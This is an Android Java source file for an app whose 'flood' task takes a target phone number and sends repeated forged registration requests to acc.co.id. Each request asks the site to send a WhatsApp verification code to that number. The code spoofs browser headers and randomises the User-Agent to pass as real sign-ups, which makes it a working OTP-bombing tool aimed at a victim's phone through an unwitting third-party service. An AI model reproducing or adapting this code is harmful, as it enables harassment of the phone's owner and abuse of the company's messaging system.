package com.xyra.panel;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;

public class MainActivity extends Activity {

    private EditText etTargetPhone, etJumlahKirim;
    private Button btnStartFlood;
    private Button btnQuick1, btnQuick3, btnQuick5, btnQuickRandom;
    private ProgressBar progressBar;
    private TextView tvStatus, tvStatusTitle;
    private TextView tvStatSuccess, tvStatFailed, tvStatAvg;
    private View statusDot;

    private static final int MAX_SEND = 5;

    private class AccFloodTask extends AsyncTask<String, Object, String> {

        private int totalSuccesses = 0;
        private int totalFailures = 0;
        private long totalDurationMs = 0;
        private int totalKirim = 0;
        private final int DELAY_SECONDS = 3;

        @Override
        protected void onPreExecute() {
            statusDot.setBackgroundResource(R.drawable.dot_orange);
            tvStatusTitle.setText("Sending...");
            tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
            tvStatSuccess.setText("0");
            tvStatFailed.setText("0");
            tvStatAvg.setText("0ms");
        }

        @Override
        protected String doInBackground(String... params) {
            String targetPhone = params[0];
            totalKirim = Integer.parseInt(params[1]);

            String urlStr = "https://www.acc.co.id/register/new-account";
            String phoneWith0 = "0" + targetPhone;

            for (int i = 1; i <= totalKirim; i++) {
                if (isCancelled()) break;

                long startTime = System.currentTimeMillis();
                String statusMsg;

                HttpURLConnection conn = null;
                try {
                    JSONArray jsonArray = new JSONArray();
                    JSONObject payload = new JSONObject();
                    payload.put("user_id", JSONObject.NULL);
                    payload.put("action", "register");
                    payload.put("send_to", phoneWith0);
                    payload.put("provider", "whatsapp");
                    jsonArray.put(payload);

                    String jsonData = jsonArray.toString();

                    Random rand = new Random();
                    String userAgent = "Mozilla/5.0 (Android) Chrome/" + (rand.nextInt(25) + 100) + ".0.0.0 Safari/537.36";

                    URL url = new URL(urlStr);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(20000);
                    conn.setDoOutput(true);

                    conn.setRequestProperty("User-Agent", userAgent);
                    conn.setRequestProperty("Accept", "text/x-component");
                    conn.setRequestProperty("Content-Type", "text/plain");
                    conn.setRequestProperty("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7");
                    conn.setRequestProperty("Origin", "https://www.acc.co.id");
                    conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
                    conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;

                    if (responseCode == 200) {
                        totalSuccesses++;
                        statusMsg = "Sent #" + i + " - " + duration + "ms";
                    } else {
                        totalFailures++;
                        statusMsg = "Failed #" + i + " (HTTP " + responseCode + ")";
                    }

                } catch (Exception e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    statusMsg = "Error #" + i;
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }

                int progress = (int) ((float) i / totalKirim * 100);
                long avgTime = (i > 0) ? totalDurationMs / i : 0;
                publishProgress(progress, i, totalSuccesses, totalFailures, avgTime, statusMsg);

                if (i < totalKirim) {
                    try {
                        Thread.sleep(DELAY_SECONDS * 1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            return "Selesai";
        }

        @Override
        protected void onProgressUpdate(Object... values) {
            progressBar.setProgress((Integer) values[0]);

            int current = (Integer) values[1];
            int suc = (Integer) values[2];
            int fail = (Integer) values[3];
            long avg = (Long) values[4];
            String msg = (String) values[5];

            tvStatSuccess.setText(String.valueOf(suc));
            tvStatFailed.setText(String.valueOf(fail));
            tvStatAvg.setText(avg + "ms");
            tvStatus.setText(msg + " (" + current + "/" + totalKirim + ")");
        }

        @Override
        protected void onPostExecute(String result) {
            progressBar.setVisibility(View.GONE);
            btnStartFlood.setEnabled(true);
            enableQuickButtons(true);

            statusDot.setBackgroundResource(R.drawable.dot_green);
            tvStatusTitle.setText("Completed");
            tvStatusTitle.setTextColor(getResources().getColor(R.color.successColor));

            long avgTime = (totalKirim > 0) ? totalDurationMs / totalKirim : 0;
            tvStatAvg.setText(avgTime + "ms");

            tvStatus.setText("Selesai! " + totalSuccesses + " berhasil, " + totalFailures + " gagal");
            Toast.makeText(MainActivity.this, "Proses Selesai!", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etTargetPhone = findViewById(R.id.et_target_phone);
        etJumlahKirim = findViewById(R.id.et_jumlah_kirim);
        btnStartFlood = findViewById(R.id.btn_start_flood);
        btnQuick1 = findViewById(R.id.btn_quick_1);
        btnQuick3 = findViewById(R.id.btn_quick_3);
        btnQuick5 = findViewById(R.id.btn_quick_5);
        btnQuickRandom = findViewById(R.id.btn_quick_random);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);
        tvStatusTitle = findViewById(R.id.tv_status_title);
        tvStatSuccess = findViewById(R.id.tv_stat_success);
        tvStatFailed = findViewById(R.id.tv_stat_failed);
        tvStatAvg = findViewById(R.id.tv_stat_avg);
        statusDot = findViewById(R.id.status_dot);

        btnQuick1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("1");
            }
        });

        btnQuick3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("3");
            }
        });

        btnQuick5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("5");
            }
        });

        btnQuickRandom.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Random rand = new Random();
                int randomNum = rand.nextInt(MAX_SEND) + 1;
                etJumlahKirim.setText(String.valueOf(randomNum));
            }
        });

        btnStartFlood.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    String targetPhone = etTargetPhone.getText().toString().trim();
                    String jumlahStr = etJumlahKirim.getText().toString().trim();

                    if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
                        Toast.makeText(MainActivity.this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    int jumlahKirim = Integer.parseInt(jumlahStr);
                    if (jumlahKirim < 1 || jumlahKirim > MAX_SEND) {
                        Toast.makeText(MainActivity.this, "Jumlah harus 1-" + MAX_SEND + "!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    btnStartFlood.setEnabled(false);
                    enableQuickButtons(false);
                    progressBar.setVisibility(View.VISIBLE);
                    progressBar.setProgress(0);

                    new AccFloodTask().execute(targetPhone, String.valueOf(jumlahKirim));

                } catch (NumberFormatException e) {
                    Toast.makeText(MainActivity.this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
                } catch (Exception e) {
                    Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    btnStartFlood.setEnabled(true);
                    enableQuickButtons(true);
                    progressBar.setVisibility(View.GONE);
                }
            }
        });
    }

    private void enableQuickButtons(boolean enabled) {
        btnQuick1.setEnabled(enabled);
        btnQuick3.setEnabled(enabled);
        btnQuick5.setEnabled(enabled);
        btnQuickRandom.setEnabled(enabled);
    }
}
